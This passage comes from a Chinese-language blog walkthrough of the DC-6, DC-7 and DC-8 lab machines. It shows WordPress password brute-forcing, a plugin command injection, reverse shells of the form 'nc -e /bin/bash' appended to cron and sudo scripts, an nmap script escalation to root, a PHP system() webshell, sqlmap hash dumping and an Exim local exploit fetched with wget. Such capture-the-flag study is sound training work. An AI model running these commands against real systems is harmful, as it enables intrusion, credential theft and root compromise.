88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P </span></span><br><span class="line"><span class="string">888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 "88b  "   "   "  </span></span><br><span class="line"><span class="string">888    Y888 888  "Y8888P "Y8888        "Y8888888P"   "Y88P"  888     888  888 888 888 888 </span></span><br><span class="line"><span class="string">                                                                                          </span></span><br><span class="line"><span class="string">                                                                                         </span></span><br><span class="line"><span class="string">Once again, a big thanks to all those who do these little challenges,</span></span><br><span class="line"><span class="string">and especially all those who give me feedback - again, it'</span>s all greatly</span><br><span class="line">appreciated.  :-)</span><br><span class="line"></span><br><span class="line">I also want to send a big thanks to all those who find the vulnerabilities</span><br><span class="line">and create the exploits that make these challenges possible.</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="DC-6渗透过程"><a href="#DC-6渗透过程" class="headerlink" title="DC-6渗透过程"></a><strong>DC-6渗透过程</strong></h2><p><strong>nmap发现打开了22/80端口，whatweb查看指纹信息，发现是wordpress系统，而且存在重定向，设置地址解析，用dirb爆破后台路径，wpscan扫描网站用户，提示用对应的密码本，爆破得到账户密码！</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># whatweb  -v 192.168.126.156  #详细扫描输出</span></span><br><span class="line">WhatWeb report <span class="keyword">for</span> http://<span class="number">192.168</span>.<span class="number">126.156</span></span><br><span class="line">Status    : <span class="number">301</span> Moved Permanently</span><br><span class="line">Title     : &lt;None&gt;</span><br><span class="line">IP        : <span class="number">192.168</span>.<span class="number">126.156</span></span><br><span class="line">Country   : RESERVED, ZZ</span><br><span class="line">...</span><br><span class="line">WhatWeb report <span class="keyword">for</span> http://wordy/</span><br><span class="line">Status    : <span class="number">200</span> OK</span><br><span class="line">Title     : Wordy &amp;<span class="comment">#8211; Just another WordPress site</span></span><br><span class="line">IP        : <span class="number">192.168</span>.<span class="number">126.156</span></span><br><span class="line">Country   : RESERVED, ZZ</span><br><span class="line">Summary   : Script[<span class="type">text</span>/<span class="type">javascript</span>], PoweredBy[<span class="type">WordPress</span>], WordPress[<span class="number">5.1</span><span class="type">.1</span>], MetaGenerator[<span class="type">WordPress</span> <span class="number">5.1</span><span class="type">.1</span>], HTTPServer[<span class="type">Debian</span> <span class="type">Linux</span>][<span class="type">Apache</span>/<span class="number">2.4</span><span class="type">.25</span> (<span class="type">Debian</span>)], UncommonHeaders[<span class="type">link</span>], Apache[<span class="number">2.4</span><span class="type">.25</span>], JQuery[<span class="number">1.12</span><span class="type">.4</span>], HTML5</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># wpscan --url http://wordy  -e u  #发现存在用户</span></span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://wordy/index.php/wp<span class="literal">-json</span>/wp/v2/users/?per_page=<span class="number">100</span>&amp;page=<span class="number">1</span></span><br><span class="line">[+] graham</span><br><span class="line">[+] mark</span><br><span class="line">[+] sarah</span><br><span class="line">[+] jens</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># dirb http://wordy  #爆破后台路径</span></span><br><span class="line">URL_BASE: http://wordy/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">---- Entering directory: http://wordy/wp<span class="literal">-admin</span>/network/ ----</span><br><span class="line">+ http://wordy/wp<span class="literal">-admin</span>/network/admin.php (CODE:<span class="number">302</span>|SIZE:<span class="number">0</span>)                                                </span><br><span class="line">+ http://wordy/wp<span class="literal">-admin</span>/network/index.php (CODE:<span class="number">302</span>|SIZE:<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#根据提示，选择此密码本（含有k01的密码）</span></span><br><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#用wpscan进行尝试，花费的时间有点久，成功爆破！</span></span><br><span class="line">root@kali:~<span class="comment"># wpscan --url http://wordy/wp-login.php   -U dc_use.txt -P passwords.txt               </span></span><br><span class="line">[<span class="type">SUCCESS</span>] - mark / helpdesk01</span><br></pre></td></tr></table></figure>

<p><strong>拿到mark用户的密码以后，登陆到后台，没啥头绪，看了下别人的博客，说是存在active管理插件命令执行漏洞</strong></p>
<p><strong>searchsploit下此漏洞，发现存在，抓包修改反弹shell链接kail！</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/6.png" alt></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit activity monitor</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                             |  Path</span><br><span class="line">                                                                                           | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Activity Monitor 2002 2.6 - Remote Denial of Service                                       | exploits/windows/dos/22690.c</span><br><span class="line">RedHat Linux 6.0/6.1/6.2 - 'pam_console' Monitor Activity After Logout                     | exploits/linux/local/19900.c</span><br><span class="line">WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection   | exploits/php/webapps/45274.html</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br><span class="line">root@kali:~# cat /usr/share/exploitdb/exploits/php/webapps/45274.html</span><br><span class="line">About:</span><br><span class="line">===========</span><br><span class="line">Component: Plainview Activity Monitor (Wordpress plugin)</span><br><span class="line">Vulnerable version: 20161228 and possibly prior</span><br><span class="line">Fixed version: 20180826</span><br><span class="line">CVE-ID: CVE-2018-15877</span><br><span class="line">CWE-ID: CWE-78</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/7.png" alt></p>
<p><strong>进入服务器后，查找提示，发现了graham的账号和密码，ssh连接登陆graham！查看下权限，发现jens用户可以执行root权限，将反弹shell写入backups.sh，并以jens用户执行，成功反弹！得到jens用户，再次查看root权限，发现jens可以以root执行nmap命令</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">python -c "import pty;pty.spawn('/bin/bash')"</span><br><span class="line">www-data@dc-6:/home/mark/stuff$ cat things-to-do.txt</span><br><span class="line">cat things-to-do.txt</span><br><span class="line">Things to do:</span><br><span class="line"></span><br><span class="line">- Restore full functionality for the hyperdrive (need to speak to Jens)</span><br><span class="line">- Buy present for Sarah's farewell party</span><br><span class="line">- Add new user: graham -GSo7isUM1D4 ye's - done</span><br><span class="line">- Apply for the OSCP course</span><br><span class="line">- Buy new laptop for Sarah's replacement</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">写入反弹shell</span></span><br><span class="line">graham@dc-6:/home/jens$ echo nc 192.168.126.33 1324 -e /bin/bash &gt; backups.sh </span><br><span class="line">graham@dc-6:/home/jens$ sudo -u jens ./backups.sh </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">发现nmap可以提权</span></span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for jens on dc-6:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jens may run the following commands on dc-6:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nmap</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">编写一个nmap的脚本，执行反弹shell得到root</span></span><br><span class="line">echo 'os.execute("/bin/sh")' &gt;  chj.nse</span><br><span class="line">sudo nmap --script=/home/jens/chj.nse</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2020-09-18 17:36 AEST</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">cd /root</span><br><span class="line">ls  </span><br><span class="line">theflag.txt</span><br><span class="line">cat theflag.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Yb        dP 888888 88     88         8888b.   dP"Yb  88b 88 888888 d8b </span><br><span class="line"> Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P </span><br><span class="line">  YbdPYbdP   88""   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   `"' </span><br><span class="line">   YP  YP    888888 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 (8) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="DC-7渗透过程"><a href="#DC-7渗透过程" class="headerlink" title="DC-7渗透过程"></a><strong>DC-7渗透过程</strong></h2><p>这次的靶机渗透和以往的思路不太一样，也算拓展了思维。网站给了个提示，Google下发现了数据库文件。</p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/8.jpg" alt></p>
<p>发现了数据库信息，ssh连接登陆成功！</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$servername = <span class="string">"localhost"</span>;</span><br><span class="line">	$username = <span class="string">"dc7user"</span>;</span><br><span class="line">	$password = <span class="string">"MdR3xOgB7#dW"</span>;</span><br><span class="line">				MdR3xOgB7<span class="comment">#dw</span></span><br><span class="line">	$dbname = <span class="string">"Staff"</span>;</span><br><span class="line">	$conn = mysqli_connect($servername, $username, $password, $dbname);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>登陆后，提示我们有一封邮件，打开发现是一个定期执行的脚本，具体查看该脚本权限，发现拥有root权限，只要在其中加入反弹shell命令，就可以提权！</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">You have new mail <span class="keyword">in</span> /var/mail/dc7user</span><br><span class="line">dc7user@dc<span class="literal">-7</span>:/var/mail<span class="variable">$</span> cat dc7user </span><br><span class="line">To: root@dc<span class="literal">-7</span></span><br><span class="line">Subject: Cron &lt;root@dc<span class="literal">-7</span>&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME<span class="literal">-Version</span>: <span class="number">1.0</span></span><br><span class="line">Content<span class="literal">-Type</span>: text/plain; charset=UTF<span class="literal">-8</span></span><br><span class="line">Content<span class="literal">-Transfer</span><span class="literal">-Encoding</span>: <span class="number">8</span>bit</span><br><span class="line">X<span class="literal">-Cron</span><span class="literal">-Env</span>: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X<span class="literal">-Cron</span><span class="literal">-Env</span>: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X<span class="literal">-Cron</span><span class="literal">-Env</span>: &lt;HOME=/root&gt;</span><br><span class="line">X<span class="literal">-Cron</span><span class="literal">-Env</span>: &lt;LOGNAME=root&gt;</span><br><span class="line">Message<span class="literal">-Id</span>: &lt;E1kJBmQ<span class="literal">-0000IC</span><span class="literal">-5x</span>@dc<span class="literal">-7</span>&gt;</span><br><span class="line">Date: Fri, <span class="number">18</span> Sep <span class="number">2020</span> <span class="number">18</span>:<span class="number">30</span>:<span class="number">06</span> +<span class="number">1000</span></span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [<span class="type">success</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看定时计划内容</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-7</span>:/opt/scripts<span class="variable">$</span> cat backups.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">rm /home/dc7user/backups/*</span><br><span class="line">cd /var/www/html/</span><br><span class="line">drush sql<span class="literal">-dump</span> -<span class="literal">-result</span><span class="operator">-file</span>=/home/dc7user/backups/website.sql</span><br><span class="line">cd ..</span><br><span class="line">tar <span class="literal">-czf</span> /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg -<span class="literal">-pinentry</span><span class="literal">-mode</span> loopback -<span class="literal">-passphrase</span> PickYourOwnPassword -<span class="literal">-symmetric</span> /home/dc7user/backups/website.sql</span><br><span class="line">gpg -<span class="literal">-pinentry</span><span class="literal">-mode</span> loopback -<span class="literal">-passphrase</span> PickYourOwnPassword -<span class="literal">-symmetric</span> /home/dc7user/backups/website.tar.gz</span><br><span class="line">chown dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line">rm /home/dc7user/backups/website.sql</span><br><span class="line">rm /home/dc7user/backups/website.tar.gz</span><br><span class="line">nc <span class="literal">-e</span> /bin/bash <span class="number">192.168</span>.<span class="number">126.33</span> <span class="number">2222</span> <span class="comment">#这是后来我加上去的，反弹shell</span></span><br><span class="line">nc <span class="literal">-e</span> /bin/bash <span class="number">192.168</span>.<span class="number">126.33</span> <span class="number">2222</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注意这里有一个drush命令，是用来管理drupal站点的shell，这里可以修改下密码</span></span><br><span class="line"><span class="comment">#注意需要切换到此目录下才可以成功执行</span></span><br><span class="line">dc7user@dc<span class="literal">-7</span>:/opt/scripts<span class="variable">$</span> cd /var/www/html</span><br><span class="line">cd /var/www/html</span><br><span class="line">dc7user@dc<span class="literal">-7</span>:/var/www/html<span class="variable">$</span> drush user<span class="literal">-password</span> admin -<span class="literal">-password</span>=<span class="string">"chj"</span></span><br><span class="line">drush user<span class="literal">-password</span> admin -<span class="literal">-password</span>=<span class="string">"chj"</span></span><br><span class="line">Changed password <span class="keyword">for</span> admin                                           [<span class="type">success</span>]</span><br></pre></td></tr></table></figure>

<p><strong>进入后台以后，需要先安装下php fiter 以便后续反弹shell，drupal 7 是自带的，8版本删去了 ，在extend下，先导入</strong></p>
<p><strong><a href="https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz" target="_blank" rel="noopener">https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz</a> 下的安装包，然后下拉找到php fiter 点击再安装。</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/9.png" alt></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/8.png" alt></p>
<p><strong>然后在add content 下 add basic page ，然后写入webshell  本地监听，反弹shell！</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/10.png" alt></p>
<p><strong>连接成功以后，将反弹shell命令写入backups.sh中，再次反弹，得到root权限，查看flag！</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz</span></span><br><span class="line"><span class="comment">#&lt;?php system('nc -e  /bin/bash 192.168.126.33 1234'?&gt;</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-7</span>:/opt/scripts<span class="variable">$</span> echo <span class="string">"nc -e /bin/bash 192.168.126.33 2222"</span> &gt;&gt; backups.sh</span><br><span class="line">python <span class="literal">-c</span> <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br><span class="line">root@dc<span class="literal">-7</span>:~<span class="comment"># pwd</span></span><br><span class="line">pwd</span><br><span class="line">/root</span><br><span class="line">root@dc<span class="literal">-7</span>:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">theflag.txt</span><br><span class="line">root@dc<span class="literal">-7</span>:~<span class="comment"># cat theflag.txt</span></span><br><span class="line">cat theflag.txt</span><br><span class="line"></span><br><span class="line"><span class="number">888</span>       <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">8888888</span>b.                             <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="number">888</span>   o   <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  <span class="string">"Y88b                            888 888 888 888 </span></span><br><span class="line"><span class="string">888  d8b  888          888 888      888    888                            888 888 888 888 </span></span><br><span class="line"><span class="string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span></span><br><span class="line"><span class="string">888d88888b888 d8P  Y8b 888 888      888    888 d88"</span><span class="string">"88b 888 "</span><span class="number">88</span>b d8P  Y8b <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="number">88888</span>P Y88888 <span class="number">88888888</span> <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>    <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">88888888</span> Y8P Y8P Y8P Y8P </span><br><span class="line"><span class="number">8888</span>P   Y8888 Y8b.     <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  .d88P Y88..<span class="number">88</span>P <span class="number">888</span>  <span class="number">888</span> Y8b.      <span class="string">"   "</span>   <span class="string">"   "</span>  </span><br><span class="line"><span class="number">888</span>P     Y888  <span class="string">"Y8888  888 888      8888888P"</span>   <span class="string">"Y88P"</span>  <span class="number">888</span>  <span class="number">888</span>  <span class="string">"Y8888  888 888 888 888 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those</span></span><br><span class="line"><span class="string">who have provided feedback, and all those who have taken the time to complete these little</span></span><br><span class="line"><span class="string">challenges.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I'm sending out an especially big thanks to:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@4nqr34z</span></span><br><span class="line"><span class="string">@D4mianWayne</span></span><br><span class="line"><span class="string">@0xmzfr</span></span><br><span class="line"><span class="string">@theart42</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If you enjoyed this CTF, send me a tweet via @DCAU7.</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="DC-8渗透过程"><a href="#DC-8渗透过程" class="headerlink" title="DC-8渗透过程"></a><strong>DC-8渗透过程</strong></h2><p> <strong>whatweb查看网站指纹信息，发现是drupal 7系统，和之前一样看看能否利用漏洞，发现不太行，不过发现网站存在sql注入漏洞，用sqlmap进行爆破，得到账号和密码，但是hash密码需要用john进行破解，需要特别久的时间才可以跑出来！</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">爆库、爆表、爆字段</span></span><br><span class="line">root@kali:~# sqlmap -u "http://192.168.126.158/?nid=1" --current-db</span><br><span class="line">current database: 'd7db'</span><br><span class="line">root@kali:~# sqlmap -u "http://192.168.126.158/?nid=1" -D d7db -T users --columns</span><br><span class="line">root@kali:~# sqlmap -u "http://192.168.126.158/?nid=1" -D d7db -T users -C name,pass --dump</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| name  | pass                                                    |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |</span><br><span class="line">| john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">rockyou密码本实在长，需要跑很久很久</span></span><br><span class="line">root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></pre></td></tr></table></figure>

<p><strong>一开始不太理解为什么选择这里插入，大概就是想办法在后台找到可以插入php语句，并且能够执行的地方，本地监听端口，成功反弹shell！</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/11.jpg" alt></p>
<p><strong>寻找相关命令是否可以提权，发现了可疑的exim4，寻找相关exp发现了有许多漏洞，查看exim4的版本，这里选取46996.sh作为提权文件，正常情况下是得一个个试过去，这里就不尝试了，然后修改exp的换行符，再上传到靶机中去，需要注意的是，要给文件增加一个可执行权限，且只有在/tmp下才可以传输文件！</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">python <span class="literal">-c</span> <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-8</span>:/var/www/html<span class="variable">$</span> find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span>  f  <span class="number">2</span>&gt;/dev/null</span><br><span class="line">find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line"></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-8</span>:/var/www/html<span class="variable">$</span> /usr/sbin/exim4 -<span class="literal">-version</span></span><br><span class="line">Exim version <span class="number">4.89</span> </span><br><span class="line"></span><br><span class="line">root@kali:/var/www/html<span class="comment"># searchsploit exim</span></span><br><span class="line">Exim <span class="number">4.87</span> - <span class="number">4.91</span> - Local Privilege Escalation                                              | exploits/linux/local/<span class="number">46996</span>.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改换行符，因为在windows下执行过</span></span><br><span class="line">vi <span class="number">46996</span>.sh</span><br><span class="line">:%s/^M//g</span><br><span class="line">:wq</span><br><span class="line"></span><br><span class="line"><span class="comment">#主机开启python -m SimpleHTTPServer 9001</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#靶机下载脚本</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-8</span>:/tmp<span class="variable">$</span> wget http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">9001</span>/<span class="number">46996</span>.sh</span><br><span class="line">wget http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">9001</span>/<span class="number">46996</span>.sh</span><br><span class="line">-<span class="literal">-2020</span><span class="literal">-09</span><span class="literal">-19</span> <span class="number">00</span>:<span class="number">15</span>:<span class="number">09</span>--  http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">9001</span>/<span class="number">46996</span>.sh</span><br><span class="line">Connecting to <span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">9001</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line">Length: <span class="number">3706</span> (<span class="number">3.6</span>K) [<span class="type">text</span>/<span class="type">x</span>-<span class="type">sh</span>]</span><br><span class="line">Saving to: <span class="string">'46996.sh'</span></span><br><span class="line"></span><br><span class="line"><span class="number">46996</span>.sh            <span class="number">100</span>%[===================&gt;]   <span class="number">3.62</span>K  --.<span class="literal">-KB</span>/s    <span class="keyword">in</span> <span class="number">0</span>s      </span><br><span class="line"></span><br><span class="line"><span class="number">2020</span><span class="literal">-09</span><span class="literal">-19</span> <span class="number">00</span>:<span 